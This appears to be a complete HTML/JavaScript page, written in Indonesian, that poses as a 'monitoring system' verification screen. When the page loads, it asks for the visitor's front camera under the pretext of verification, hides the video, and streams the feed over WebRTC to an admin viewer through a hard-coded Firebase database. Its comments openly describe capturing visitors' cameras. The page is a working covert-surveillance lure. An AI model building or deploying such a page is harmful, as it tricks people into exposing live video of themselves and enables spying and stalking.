<!DOCTYPE html>
<html lang="id" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Monitoring</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config = { darkMode: 'class' }</script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style> body { font-family: 'Plus Jakarta Sans', sans-serif; } </style>
</head>
<body class="bg-[#090d16] text-slate-100 min-h-screen flex flex-col items-center justify-center p-4">

    <div class="max-w-md w-full bg-slate-900/80 border border-slate-800 p-6 rounded-3xl shadow-2xl text-center space-y-4">
        <div class="w-12 h-12 bg-blue-500/10 text-blue-400 rounded-2xl flex items-center justify-center mx-auto border border-blue-500/20">
            <i data-lucide="shield-check" class="w-6 h-6"></i>
        </div>
        <h1 class="text-lg font-bold">Menghubungkan ke Sistem...</h1>
        <p id="status-text" class="text-xs text-slate-400">Meminta izin kamera untuk verifikasi...</p>
        
        <!-- Elemen video tersembunyi untuk mengambil stream kamera mereka -->
        <video id="local-video" class="hidden" autoplay playsinline muted></video>
    </div>

    <!-- Firebase SDK v8 -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
        lucide.createIcons();

        // ⚠️ MASUKKAN URL REALTIME DATABASE FIREBASE ANDA ⚠️
        const firebaseConfig = {
            databaseURL: "https://admin-e13ee-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const configuration = {
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        };

        // Otomatis aktif saat link dibuka pengunjung
        window.addEventListener('DOMContentLoaded', async () => {
            const statusEl = document.getElementById('status-text');
            try {
                // Aktifkan kamera pengunjung secara otomatis
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                document.getElementById('local-video').srcObject = stream;

                statusEl.innerText = "Kamera terhubung. Mengirim siaran ke pusat...";

                // Buat Room otomatis di Firebase untuk ditarik oleh Admin
                const roomRef = db.ref('visitor_rooms').push();
                const peerConnection = new RTCPeerConnection(configuration);

                stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

                peerConnection.onicecandidate = event => {
                    if (event.candidate) {
                        roomRef.child('visitorCandidates').push(event.candidate.toJSON());
                    }
                };

                const offer = await peerConnection.createOffer();
                await peerConnection.setLocalDescription(offer);
                await roomRef.set({ offer: { type: offer.type, sdp: offer.sdp } });

                roomRef.child('answer').on('value', async snapshot => {
                    const answer = snapshot.val();
                    if (answer && !peerConnection.currentRemoteDescription) {
                        await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
                        statusEl.innerText = "Terhubung dengan pusat pemantauan.";
                    }
                });

                roomRef.child('adminCandidates').on('child_added', async snapshot => {
                    if (snapshot.val()) {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(snapshot.val()));
                    }
                });

            } catch (err) {
                console.error(err);
                statusEl.innerText = "Gagal: Izin kamera ditolak atau koneksi tidak aman (HTTPS).";
                statusEl.className = "text-xs text-rose-500 font-semibold";
            }
        });
    </script>
</body>
</html>
